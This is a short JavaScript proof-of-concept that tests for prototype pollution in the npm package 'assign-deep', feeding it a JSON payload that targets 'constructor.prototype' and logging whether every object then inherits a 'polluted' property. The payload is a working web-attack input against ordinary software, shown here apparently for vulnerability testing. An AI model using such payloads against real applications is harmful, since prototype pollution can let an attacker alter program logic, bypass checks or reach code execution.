var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const assign = require('assign-deep');
const payloads = ['{"constructor.prototype": {"polluted":"yes"}}'];
var obj = {};
console.log({}.polluted);
assign(obj, JSON.parse(payloads[0]));
console.log({}.polluted);